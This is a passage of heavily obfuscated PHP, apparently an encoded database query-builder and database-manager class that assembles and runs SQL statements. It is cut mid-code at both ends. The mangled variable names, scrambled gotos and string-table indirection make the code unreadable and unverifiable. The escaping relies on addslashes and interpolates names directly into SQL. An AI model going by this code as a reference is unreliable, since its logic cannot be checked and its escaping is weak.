$Bìö¼Ÿõº¤[] = $aÓµ¥¢‘õ[263] . $this->parseWhereItem($this->parseKey($AŸ¬Ñ¸ÏÒ÷), $a«à£Ğ¡©) . $aÓµ¥¢‘õ[833]; } $añŠ­—·í .= implode($aÓµ¥¢‘õ[929], $Bìö¼Ÿõº¤); } else { $añŠ­—·í .= $this->parseWhereItem($this->parseKey($E‹Î–‹ñ), $Aéº‡¡ã†‰); } } $añŠ­—·í .= $aÓµ¥¢‘õ[281] . $c­½ ±´; } $añŠ­—·í = substr($añŠ­—·í, 0, -strlen($c­½ ±´)); } return empty($añŠ­—·í) ? $aÓµ¥¢‘õ[33] : $aÓµ¥¢‘õ[935] . $añŠ­—·í; } protected function parseWhereItem($Bê¹ÍÌÜ›Ö, $a£Œ©Ô£ˆß) { $fÆ×¸š¸¨ =& $_SERVER[¢Í]; $B¸à«é¥·Ó = $fÆ×¸š¸¨[33]; if (is_array($a£Œ©Ô£ˆß)) { if (is_string($a£Œ©Ô£ˆß[0])) { $dîï³Ü¾§ = strtolower($a£Œ©Ô£ˆß[0]); if (in_array($a£Œ©Ô£ˆß[0], array($fÆ×¸š¸¨[919], $fÆ×¸š¸¨[936], $fÆ×¸š¸¨[937], $fÆ×¸š¸¨[938], $fÆ×¸š¸¨[939], $fÆ×¸š¸¨[940]))) { $B¸à«é¥·Ó .= $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $a£Œ©Ô£ˆß[0] . $fÆ×¸š¸¨[50] . $this->parseValue($a£Œ©Ô£ˆß[1]); } elseif (preg_match($fÆ×¸š¸¨[941], $a£Œ©Ô£ˆß[0])) { $B¸à«é¥·Ó .= $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $this->exp[$dîï³Ü¾§] . $fÆ×¸š¸¨[50] . $this->parseValue($a£Œ©Ô£ˆß[1]); } elseif (preg_match($fÆ×¸š¸¨[942], $a£Œ©Ô£ˆß[0])) { if (is_array($a£Œ©Ô£ˆß[1])) { $Aï¯‹ÁÒ£¡ = isset($a£Œ©Ô£ˆß[2]) ? strtoupper($a£Œ©Ô£ˆß[2]) : $fÆ×¸š¸¨[927]; if (in_array($Aï¯‹ÁÒ£¡, array($fÆ×¸š¸¨[926], $fÆ×¸š¸¨[927], $fÆ×¸š¸¨[928]))) { $cÛÑ¯‚„ßÍ = array(); foreach ($a£Œ©Ô£ˆß[1] as $aà£šˆ×¤Š) { $cÛÑ¯‚„ßÍ[] = $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $this->exp[$dîï³Ü¾§] . $fÆ×¸š¸¨[50] . $this->parseValue($aà£šˆ×¤Š); } $B¸à«é¥·Ó .= $fÆ×¸š¸¨[263] . implode($fÆ×¸š¸¨[50] . $Aï¯‹ÁÒ£¡ . $fÆ×¸š¸¨[50], $cÛÑ¯‚„ßÍ) . $fÆ×¸š¸¨[833]; } } else { $B¸à«é¥·Ó .= $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $this->exp[$dîï³Ü¾§] . $fÆ×¸š¸¨[50] . $this->parseValue($a£Œ©Ô£ˆß[1]); } } elseif ($fÆ×¸š¸¨[300] == $dîï³Ü¾§) { $B¸à«é¥·Ó .= $fÆ×¸š¸¨[831] . $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $a£Œ©Ô£ˆß[1] . $fÆ×¸š¸¨[943]; } elseif (preg_match($fÆ×¸š¸¨[944], $a£Œ©Ô£ˆß[0])) { $B¸à«é¥·Ó .= $a£Œ©Ô£ˆß[0]; } elseif (preg_match($fÆ×¸š¸¨[945], $a£Œ©Ô£ˆß[0])) { if (isset($a£Œ©Ô£ˆß[2]) && $fÆ×¸š¸¨[300] == $a£Œ©Ô£ˆß[2]) { $B¸à«é¥·Ó .= $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $this->exp[$dîï³Ü¾§] . $fÆ×¸š¸¨[50] . $a£Œ©Ô£ˆß[1]; } else { if (is_string($a£Œ©Ô£ˆß[1])) { $a£Œ©Ô£ˆß[1] = explode($fÆ×¸š¸¨[47], $a£Œ©Ô£ˆß[1]); } $a‚›×•¶‡¼ = implode($fÆ×¸š¸¨[47], $this->parseValue($a£Œ©Ô£ˆß[1])); $B¸à«é¥·Ó .= $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $this->exp[$dîï³Ü¾§] . $fÆ×¸š¸¨[831] . $a‚›×•¶‡¼ . $fÆ×¸š¸¨[833]; } } elseif (preg_match($fÆ×¸š¸¨[946], $a£Œ©Ô£ˆß[0])) { $dÇ”¾»¹Æ‚ = is_string($a£Œ©Ô£ˆß[1]) ? explode($fÆ×¸š¸¨[47], $a£Œ©Ô£ˆß[1]) : $a£Œ©Ô£ˆß[1]; $B¸à«é¥·Ó .= $fÆ×¸š¸¨[831] . $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $this->exp[$dîï³Ü¾§] . $fÆ×¸š¸¨[50] . $this->parseValue($dÇ”¾»¹Æ‚[0]) . $fÆ×¸š¸¨[929] . $this->parseValue($dÇ”¾»¹Æ‚[1]) . $fÆ×¸š¸¨[281]; } else { think_exception(think_lang($fÆ×¸š¸¨[932]) . $fÆ×¸š¸¨[4] . $a£Œ©Ô£ˆß[0]); } } else { $C³‡…‰èé† = count($a£Œ©Ô£ˆß); $c¦¶Ş¦•ƒ‰ = $fÆ×¸š¸¨[33]; if (is_string($a£Œ©Ô£ˆß[$C³‡…‰èé† - 1])) { $c¦¶Ş¦•ƒ‰ = isset($a£Œ©Ô£ˆß[$C³‡…‰èé† - 1]) ? strtoupper($a£Œ©Ô£ˆß[$C³‡…‰èé† - 1]) : $fÆ×¸š¸¨[33]; if (in_array($c¦¶Ş¦•ƒ‰, array($fÆ×¸š¸¨[926], $fÆ×¸š¸¨[927], $fÆ×¸š¸¨[928]))) { $C³‡…‰èé† = $C³‡…‰èé† - 1; } } else { $c¦¶Ş¦•ƒ‰ = $fÆ×¸š¸¨[926]; } for ($B’é¢‚ÕÕ = 0; $B’é¢‚ÕÕ < $C³‡…‰èé†; $B’é¢‚ÕÕ++) { $dÇ”¾»¹Æ‚ = is_array($a£Œ©Ô£ˆß[$B’é¢‚ÕÕ]) ? $a£Œ©Ô£ˆß[$B’é¢‚ÕÕ][1] : $a£Œ©Ô£ˆß[$B’é¢‚ÕÕ]; if ($fÆ×¸š¸¨[300] == strtolower($a£Œ©Ô£ˆß[$B’é¢‚ÕÕ][0])) { $B¸à«é¥·Ó .= $fÆ×¸š¸¨[263] . $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $dÇ”¾»¹Æ‚ . $fÆ×¸š¸¨[943] . $c¦¶Ş¦•ƒ‰ . $fÆ×¸š¸¨[50]; } else { $BŠÜÄ…³»’ = is_array($a£Œ©Ô£ˆß[$B’é¢‚ÕÕ]) ? $this->exp[strtolower($a£Œ©Ô£ˆß[$B’é¢‚ÕÕ][0])] : $fÆ×¸š¸¨[919]; if (!$BŠÜÄ…³»’ && is_array($a£Œ©Ô£ˆß[$B’é¢‚ÕÕ]) && in_array($a£Œ©Ô£ˆß[$B’é¢‚ÕÕ][0], array($fÆ×¸š¸¨[919], $fÆ×¸š¸¨[936], $fÆ×¸š¸¨[937], $fÆ×¸š¸¨[938], $fÆ×¸š¸¨[939], $fÆ×¸š¸¨[940]))) { $BŠÜÄ…³»’ = $a£Œ©Ô£ˆß[$B’é¢‚ÕÕ][0]; } $B¸à«é¥·Ó .= $fÆ×¸š¸¨[263] . $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[50] . $BŠÜÄ…³»’ . $fÆ×¸š¸¨[50] . $this->parseValue($dÇ”¾»¹Æ‚) . $fÆ×¸š¸¨[943] . $c¦¶Ş¦•ƒ‰ . $fÆ×¸š¸¨[50]; } } $B¸à«é¥·Ó = substr($B¸à«é¥·Ó, 0, -4); } } else { $B¸à«é¥·Ó .= $Bê¹ÍÌÜ›Ö . $fÆ×¸š¸¨[947] . $this->parseValue($a£Œ©Ô£ˆß); } return $B¸à«é¥·Ó; } protected function parseThinkWhere($b·ÂÜ¦–è©, $EíèÀÁ¦à) { $fß•µ›ÃÂ¨ =& $_SERVER[¢Í]; $a¾™”ŸÖ›Œ = $fß•µ›ÃÂ¨[33]; switch ($b·ÂÜ¦–è©) { case $fß•µ›ÃÂ¨[355]: $a¾™”ŸÖ›Œ = $EíèÀÁ¦à; break; case $fß•µ›ÃÂ¨[930]: $a¾™”ŸÖ›Œ = is_string($EíèÀÁ¦à) ? $EíèÀÁ¦à : substr($this->parseWhere($EíèÀÁ¦à), 6); break; case $fß•µ›ÃÂ¨[948]: parse_str($EíèÀÁ¦à, $bÇ´¢Èî); if (isset($bÇ´¢Èî[$fß•µ›ÃÂ¨[925]])) { $eİ¤Õà‡Ï = $fß•µ›ÃÂ¨[50] . strtoupper($bÇ´¢Èî[$fß•µ›ÃÂ¨[925]]) . $fß•µ›ÃÂ¨[50]; unset($bÇ´¢Èî[$fß•µ›ÃÂ¨[925]]); } else { $eİ¤Õà‡Ï = $fß•µ›ÃÂ¨[929]; } $A×¢³ÉŞ„ = array(); foreach ($bÇ´¢Èî as $a¤ÏºË”¬– => $aÍ¼Í÷àÜÎ) { $A×¢³ÉŞ„[] = $this->parseKey($a¤ÏºË”¬–) . $fß•µ›ÃÂ¨[947] . $this->parseValue($aÍ¼Í÷àÜÎ); } $a¾™”ŸÖ›Œ = implode($eİ¤Õà‡Ï, $A×¢³ÉŞ„); break; } return $a¾™”ŸÖ›Œ; } protected function parseLimit($Cï§Æ«ÑŠç) { $E¶ñŸˆÜ =& $_SERVER[¢Í]; return !empty($Cï§Æ«ÑŠç) ? $E¶ñŸˆÜ[48] . $Cï§Æ«ÑŠç . $E¶ñŸˆÜ[50] : $E¶ñŸˆÜ[33]; } protected function parseJoin($e¦ê¿¸‚³À) { $BÁ„ î§ˆ =& $_SERVER[¢Í]; $cÁ ÷öäÉ = $BÁ„ î§ˆ[33]; if (!empty($e¦ê¿¸‚³À)) { if (is_array($e¦ê¿¸‚³À)) { foreach ($e¦ê¿¸‚³À as $B¡´§šÂÌ => $AÈ²‹ÒÆ‘) { if (!1 !== stripos($AÈ²‹ÒÆ‘, $BÁ„ î§ˆ[949])) { $cÁ ÷öäÉ .= $BÁ„ î§ˆ[50] . $AÈ²‹ÒÆ‘; } else { $cÁ ÷öäÉ .= $BÁ„ î§ˆ[950] . $AÈ²‹ÒÆ‘; } } } else { $cÁ ÷öäÉ .= $BÁ„ î§ˆ[950] . $e¦ê¿¸‚³À; } } $cÁ ÷öäÉ = preg_replace($BÁ„ î§ˆ[951], think_config($BÁ„ î§ˆ[857]) . $BÁ„ î§ˆ[952], $cÁ ÷öäÉ); return $cÁ ÷öäÉ; } protected function parseOrder($A…‘Õ„ë) { $FÃØÌÜ­Û =& $_SERVER[¢Í]; if (is_array($A…‘Õ„ë)) { $e…Ã•›óÏÚ = array(); foreach ($A…‘Õ„ë as $B£‚¹ö”õ => $DÄŸÜãê) { if (is_numeric($B£‚¹ö”õ)) { $e…Ã•›óÏÚ[] = $this->parseKey($DÄŸÜãê); } else { $DÄŸÜãê = in_array(strtoupper(trim($DÄŸÜãê)), array($FÃØÌÜ­Û[953], $FÃØÌÜ­Û[954])) ? $FÃØÌÜ­Û[50] . $DÄŸÜãê : $FÃØÌÜ­Û[33]; if (preg_match($FÃØÌÜ­Û[955], $B£‚¹ö”õ)) { $e…Ã•›óÏÚ[] = $this->parseKey($B£‚¹ö”õ) . $DÄŸÜãê; } else { think_exception($FÃØÌÜ­Û[956] . $B£‚¹ö”õ); } } } $A…‘Õ„ë = implode($FÃØÌÜ­Û[47], $e…Ã•›óÏÚ); } return !empty($A…‘Õ„ë) ? $FÃØÌÜ­Û[957] . $A…‘Õ„ë : $FÃØÌÜ­Û[33]; } protected function parseGroup($FÔ‘“Ì‚×ï) { $EÚƒ¯ÑÆÎò =& $_SERVER[¢Í]; return !empty($FÔ‘“Ì‚×ï) ? $EÚƒ¯ÑÆÎò[958] . $FÔ‘“Ì‚×ï : $EÚƒ¯ÑÆÎò[33]; } protected function parseHaving($bëè„”¬‡¢) { $f«îôõ¢¸Ğ =& $_SERVER[¢Í]; return !empty($bëè„”¬‡¢) ? $f«îôõ¢¸Ğ[959] . $bëè„”¬‡¢ : $f«îôõ¢¸Ğ[33]; } protected function parseComment($eñ¯Ç¾’ÕĞ) { $F‰ä÷íŠ¶ =& $_SERVER[¢Í]; return !empty($eñ¯Ç¾’ÕĞ) ? $F‰ä÷íŠ¶[960] . $eñ¯Ç¾’ÕĞ . $F‰ä÷íŠ¶[961] : $F‰ä÷íŠ¶[33]; } protected function parseDistinct($cöˆ…ïË«) { $fäìóáø„Û =& $_SERVER[¢Í]; return !empty($cöˆ…ïË«) ? $fäìóáø„Û[962] : $fäìóáø„Û[33]; } protected function parseUnion($c¡ÀÔšÃÒ) { $aÎåÔäâ =& $_SERVER[¢Í]; if (empty($c¡ÀÔšÃÒ)) { return $aÎåÔäâ[33]; } if (isset($c¡ÀÔšÃÒ[$aÎåÔäâ[351]])) { $Cø´ °¶ÉÊ = $aÎåÔäâ[963]; unset($c¡ÀÔšÃÒ[$aÎåÔäâ[351]]); } else { $Cø´ °¶ÉÊ = $aÎåÔäâ[964]; } foreach ($c¡ÀÔšÃÒ as $f‰ğÔŞÈÓã) { $dšáÉ‰âé[] = $Cø´ °¶ÉÊ . (is_array($f‰ğÔŞÈÓã) ? $this->buildSelectSql($f‰ğÔŞÈÓã) : $f‰ğÔŞÈÓã); } return implode($aÎåÔäâ[50], $dšáÉ‰âé); } public function insert($C‰”…È‹óˆ, $fÈğÏ”ò˜´ = array(), $BÍäÛŒ‰ á = false) { goto eŸèêÍ˜ãó; c‘ëªŒëÔ’: foreach ($C‰”…È‹óˆ as $eÑÃãâ ’Ô => $E¼ÁÌ¤ãí‡) { if (is_array($E¼ÁÌ¤ãí‡) && $bÌ”‰÷Š•Ó[300] == $E¼ÁÌ¤ãí‡[0]) { $a•çÈ¹îÑ’[] = $this->parseKey($eÑÃãâ ’Ô); $E‘Ú´×”—[] = $E¼ÁÌ¤ãí‡[1]; } elseif (is_scalar($E¼ÁÌ¤ãí‡) || is_null($E¼ÁÌ¤ãí‡)) { $a•çÈ¹îÑ’[] = $this->parseKey($eÑÃãâ ’Ô); $E‘Ú´×”—[] = $this->parseValue($E¼ÁÌ¤ãí‡); } } $c´êƒºàè = ($BÍäÛŒ‰ á ? $bÌ”‰÷Š•Ó[835] : $bÌ”‰÷Š•Ó[836]) . $bÌ”‰÷Š•Ó[837] . $this->parseTable($fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[282]]) . $bÌ”‰÷Š•Ó[831] . implode($bÌ”‰÷Š•Ó[47], $a•çÈ¹îÑ’) . $bÌ”‰÷Š•Ó[832] . implode($bÌ”‰÷Š•Ó[47], $E‘Ú´×”—) . $bÌ”‰÷Š•Ó[833]; $c´êƒºàè .= $this->parseLock(isset($fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[787]]) ? $fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[787]] : !1); goto cŒßö¾…¨…; cŒßö¾…¨…: $c´êƒºàè .= $this->parseComment(!empty($fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[357]]) ? $fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[357]] : $bÌ”‰÷Š•Ó[33]); return $this->execute($c´êƒºàè, $this->parseBind(!empty($fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[288]]) ? $fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[288]] : array())); goto cï£¦”‡ÆÕ; eŸèêÍ˜ãó: $bÌ”‰÷Š•Ó =& $_SERVER[¢Í]; $E‘Ú´×”— = $a•çÈ¹îÑ’ = array(); $this->model = $fÈğÏ”ò˜´[$bÌ”‰÷Š•Ó[284]]; goto c‘ëªŒëÔ’; cï£¦”‡ÆÕ: } public function selectInsert($EœƒÉ·¤œ§, $bâ›áë¥ôİ, $D²³ÍÎÏŠµ = array()) { goto FªØëÆóÀ; dâ’½Òø: return $this->execute($A­òâä™ˆô, $this->parseBind(!empty($D²³ÍÎÏŠµ[$bÔçÕ‰š¼ì[288]]) ? $D²³ÍÎÏŠµ[$bÔçÕ‰š¼ì[288]] : array())); goto cò™ò©åŠĞ; FªØëÆóÀ: $bÔçÕ‰š¼ì =& $_SERVER[¢Í]; $this->model = $D²³ÍÎÏŠµ[$bÔçÕ‰š¼ì[284]]; if (is_string($EœƒÉ·¤œ§)) { $EœƒÉ·¤œ§ = explode($bÔçÕ‰š¼ì[47], $EœƒÉ·¤œ§); } goto B—ô…àäğË; B—ô…àäğË: array_walk($EœƒÉ·¤œ§, array($this, $bÔçÕ‰š¼ì[834])); $A­òâä™ˆô = $bÔçÕ‰š¼ì[965] . $this->parseTable($bâ›áë¥ôİ) . $bÔçÕ‰š¼ì[831] . implode($bÔçÕ‰š¼ì[47], $EœƒÉ·¤œ§) . $bÔçÕ‰š¼ì[943]; $A­òâä™ˆô .= $this->buildSelectSql($D²³ÍÎÏŠµ); goto dâ’½Òø; cò™ò©åŠĞ: } public function update($C¶¼ÖÒÈœ, $Eµ±ˆŸ«) { $A¡í¦¡§ÀÉ =& $_SERVER[¢Í]; $this->model = $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[284]]; $CÅµ´£òÉ‡ = $A¡í¦¡§ÀÉ[966] . $this->parseTable($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[282]]) . $this->parseSet($C¶¼ÖÒÈœ) . $this->parseWhere(!empty($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[278]]) ? $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[278]] : $A¡í¦¡§ÀÉ[33]) . $this->parseOrder(!empty($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[366]]) ? $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[366]] : $A¡í¦¡§ÀÉ[33]) . $this->parseLimit(!empty($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[295]]) ? $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[295]] : $A¡í¦¡§ÀÉ[33]) . $this->parseLock(isset($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[787]]) ? $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[787]] : !1) . $this->parseComment(!empty($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[357]]) ? $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[357]] : $A¡í¦¡§ÀÉ[33]); return $this->execute($CÅµ´£òÉ‡, $this->parseBind(!empty($Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[288]]) ? $Eµ±ˆŸ«[$A¡í¦¡§ÀÉ[288]] : array())); } public function delete($eßíÓÁŸå = array()) { $BùÏ’×ŸÃĞ =& $_SERVER[¢Í]; $this->model = $eßíÓÁŸå[$BùÏ’×ŸÃĞ[284]]; $Aó¯Á‰ä‚² = $BùÏ’×ŸÃĞ[967] . $this->parseTable($eßíÓÁŸå[$BùÏ’×ŸÃĞ[282]]) . $this->parseWhere(!empty($eßíÓÁŸå[$BùÏ’×ŸÃĞ[278]]) ? $eßíÓÁŸå[$BùÏ’×ŸÃĞ[278]] : $BùÏ’×ŸÃĞ[33]) . $this->parseOrder(!empty($eßíÓÁŸå[$BùÏ’×ŸÃĞ[366]]) ? $eßíÓÁŸå[$BùÏ’×ŸÃĞ[366]] : $BùÏ’×ŸÃĞ[33]) . $this->parseLimit(!empty($eßíÓÁŸå[$BùÏ’×ŸÃĞ[295]]) ? $eßíÓÁŸå[$BùÏ’×ŸÃĞ[295]] : $BùÏ’×ŸÃĞ[33]) . $this->parseLock(isset($eßíÓÁŸå[$BùÏ’×ŸÃĞ[787]]) ? $eßíÓÁŸå[$BùÏ’×ŸÃĞ[787]] : !1) . $this->parseComment(!empty($eßíÓÁŸå[$BùÏ’×ŸÃĞ[357]]) ? $eßíÓÁŸå[$BùÏ’×ŸÃĞ[357]] : $BùÏ’×ŸÃĞ[33]); return $this->execute($Aó¯Á‰ä‚², $this->parseBind(!empty($eßíÓÁŸå[$BùÏ’×ŸÃĞ[288]]) ? $eßíÓÁŸå[$BùÏ’×ŸÃĞ[288]] : array())); } public function select($C™Û›Àóõ” = array()) { goto a’ÒöÑˆ§ï; fÊõï•ã‘: $bêóÌ»‹ì = isset($C™Û›Àóõ”[$e ¸”†Ÿ¦[352]]) ? $C™Û›Àóõ”[$e ¸”†Ÿ¦[352]] : !1; if ($bêóÌ»‹ì) { $F¢Áâù¤§Ç = is_string($bêóÌ»‹ì[$e ¸”†Ÿ¦[99]]) ? $bêóÌ»‹ì[$e ¸”†Ÿ¦[99]] : $e ¸”†Ÿ¦[968] . md5($Cˆ¢¦½¿ß); $fñ³ôœĞ° = think_cache($F¢Áâù¤§Ç, $e ¸”†Ÿ¦[33], $bêóÌ»‹ì); if (!1 !== $fñ³ôœĞ°) { return $fñ³ôœĞ°; } } $C”³ÒÕ…Ë = $this->query($Cˆ¢¦½¿ß, $this->parseBind(!empty($C™Û›Àóõ”[$e ¸”†Ÿ¦[288]]) ? $C™Û›Àóõ”[$e ¸”†Ÿ¦[288]] : array())); goto AŞ‹„ŸÑÂÂ; AŞ‹„ŸÑÂÂ: if ($bêóÌ»‹ì && !1 !== $C”³ÒÕ…Ë) { think_cache($F¢Áâù¤§Ç, $C”³ÒÕ…Ë, $bêóÌ»‹ì); } return $C”³ÒÕ…Ë; goto f¡÷²¶ª; a’ÒöÑˆ§ï: $e ¸”†Ÿ¦ =& $_SERVER[¢Í]; $this->model = $C™Û›Àóõ”[$e ¸”†Ÿ¦[284]]; $Cˆ¢¦½¿ß = $this->buildSelectSql($C™Û›Àóõ”); goto fÊõï•ã‘; f¡÷²¶ª: } public function buildSelectSql($d§ïŠ‡Éô— = array()) { goto a·–¬×‘; a·–¬×‘: $AîíëäË =& $_SERVER[¢Í]; if (isset($d§ïŠ‡Éô—[$AîíëäË[356]])) { if (strpos($d§ïŠ‡Éô—[$AîíëäË[356]], $AîíëäË[47])) { list($E¹‹À¹î£Ÿ, $eåÜ¤ì±‰) = explode($AîíëäË[47], $d§ïŠ‡Éô—[$AîíëäË[356]]); } else { $E¹‹À¹î£Ÿ = $d§ïŠ‡Éô—[$AîíëäË[356]]; } $E¹‹À¹î£Ÿ = $E¹‹À¹î£Ÿ ? $E¹‹À¹î£Ÿ : 1; $eåÜ¤ì±‰ = isset($eåÜ¤ì±‰) ? $eåÜ¤ì±‰ : (is_numeric($d§ïŠ‡Éô—[$AîíëäË[295]]) ? $d§ïŠ‡Éô—[$AîíëäË[295]] : 20); $cÔê¨¸Ìİ· = $eåÜ¤ì±‰ * ((int) $E¹‹À¹î£Ÿ - 1); $d§ïŠ‡Éô—[$AîíëäË[295]] = $cÔê¨¸Ìİ· . $AîíëäË[47] . $eåÜ¤ì±‰; } if (think_config($AîíëäË[969])) { $b×ù ÄòŠ = $AîíëäË[970] . md5(serialize($d§ïŠ‡Éô—)); $EâÔê—“ˆ = think_cache($b×ù ÄòŠ); if ($EâÔê—“ˆ) { return $EâÔê—“ˆ; } } goto BÍÛ½İÈ™; BÍÛ½İÈ™: $C“ ãÕîÊˆ = $this->parseSql($this->selectSql, $d§ïŠ‡Éô—); $C“ ãÕîÊˆ .= $this->parseLock(isset($d§ïŠ‡Éô—[$AîíëäË[787]]) ? $d§ïŠ‡Éô—[$AîíëäË[787]] : !1); if (isset($b×ù ÄòŠ)) { think_cache($b×ù ÄòŠ, $C“ ãÕîÊˆ); } goto dÒ‰ËÖæÒİ; dÒ‰ËÖæÒİ: return $C“ ãÕîÊˆ; goto BšÍ×ã”Ğ»; BšÍ×ã”Ğ»: } public function parseSql($eŸÁŞ¨‚¯, $fÎô„Œšö÷ = array()) { $Eˆ˜ƒÌï®† =& $_SERVER[¢Í]; $eŸÁŞ¨‚¯ = str_replace(array($Eˆ˜ƒÌï®†[971], $Eˆ˜ƒÌï®†[972], $Eˆ˜ƒÌï®†[973], $Eˆ˜ƒÌï®†[974], $Eˆ˜ƒÌï®†[975], $Eˆ˜ƒÌï®†[976], $Eˆ˜ƒÌï®†[977], $Eˆ˜ƒÌï®†[978], $Eˆ˜ƒÌï®†[979], $Eˆ˜ƒÌï®†[980], $Eˆ˜ƒÌï®†[981]), array($this->parseTable("{$fÎô„Œšö÷[$Eˆ˜ƒÌï®†[282]]}"), $this->parseDistinct(isset($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[982]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[982]] : !1), $this->parseField(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[276]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[276]] : $Eˆ˜ƒÌï®†[190]), $this->parseJoin(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[285]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[285]] : $Eˆ˜ƒÌï®†[33]), $this->parseWhere(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[278]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[278]] : $Eˆ˜ƒÌï®†[33]), $this->parseGroup(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[983]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[983]] : $Eˆ˜ƒÌï®†[33]), $this->parseHaving(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[984]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[984]] : $Eˆ˜ƒÌï®†[33]), $this->parseOrder(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[366]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[366]] : $Eˆ˜ƒÌï®†[33]), $this->parseLimit(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[295]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[295]] : $Eˆ˜ƒÌï®†[33]), $this->parseUnion(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[350]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[350]] : $Eˆ˜ƒÌï®†[33]), $this->parseComment(!empty($fÎô„Œšö÷[$Eˆ˜ƒÌï®†[357]]) ? $fÎô„Œšö÷[$Eˆ˜ƒÌï®†[357]] : $Eˆ˜ƒÌï®†[33])), $eŸÁŞ¨‚¯); return $eŸÁŞ¨‚¯; } public function getLastSql($a×’Óôœ = '') { return $a×’Óôœ ? $this->modelSql[$a×’Óôœ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($EÉÖÁÜ†á) { return addslashes($EÉÖÁÜ†á); } public function setModel($F„Ó¼¿ÈËå) { $this->model = $F„Ó¼¿ÈËå; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($E‚â§ˆóœ, $DçãÒÍñ‰‹ = '') { $this->database = $E‚â§ˆóœ; $this->type = $DçãÒÍñ‰‹; } public function model($F‰ø¡¢Ï‰ = '') { return new ModelBase($F‰ø¡¢Ï‰, $_SERVER[¢Í][33], $this->database); } public function db($E¬®®„ì•´ = false) { goto b›‘ƒ”ì×¦; b›‘ƒ”ì×¦: $E—•ÖÅÈ¿ =& $_SERVER[¢Í]; $a‚ÒÌÛ„Ô = array_change_key_case($this->database); if ($this->type == $E—•ÖÅÈ¿[9] || !$E¬®®„ì•´) { return $this->model()->db(); } goto aÏëËØ¯¢»; aèªÄç…ëÖ: $this->database = $a‚ÒÌÛ„Ô; $FŸÒ—ÂÜØ = $this->model()->db(); try { $a¿ƒìê´‚ = $FŸÒ—ÂÜØ->execute("\x73\x68\157\x77\40\x64\141\164\141\x62\141\163\x65\163\40\154\x69\153\x65\x20\x27{$E•ñº™“’ê}\x27"); } catch (Exception $dŒî’‹Üâ‚) { } goto aµÈ†ïˆ†; aÏëËØ¯¢»: $E•ñº™“’ê = $a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[897]]; $a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[897]] = $E—•ÖÅÈ¿[33]; if ($a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[736]] == $E—•ÖÅÈ¿[737]) { $dÛ×éˆ»âç = $a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[738]]; $a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[738]] = substr($dÛ×éˆ»âç, 0, strrpos($dÛ×éˆ»âç, $E—•ÖÅÈ¿[985])); } goto aèªÄç…ëÖ; F—òÀƒª†¨: $this->database = $a‚ÒÌÛ„Ô; $FŸÒ—ÂÜØ->execute("\165\x73\145\x20\140{$E•ñº™“’ê}\x60"); return $FŸÒ—ÂÜØ; goto Dƒ³ôêÛå¦; aµÈ†ïˆ†: if (!$a¿ƒìê´‚) { $FŸÒ—ÂÜØ->execute("\x63\x72\x65\x61\x74\x65\40\144\x61\x74\141\x62\141\163\145\x20\x60{$E•ñº™“’ê}\x60"); } $a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[897]] = $E•ñº™“’ê; if ($a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[736]] == $E—•ÖÅÈ¿[737]) { $a‚ÒÌÛ„Ô[$E—•ÖÅÈ¿[738]] .= $E—•ÖÅÈ¿[985] . $E•ñº™“’ê; } goto F—òÀƒª†¨; Dƒ³ôêÛå¦: } public function createTable($c¨ÊÎ¡ƒ¬„, $eÁ¤µ²ˆÏù = null) { $aŠ÷Â‰ó¢ =& 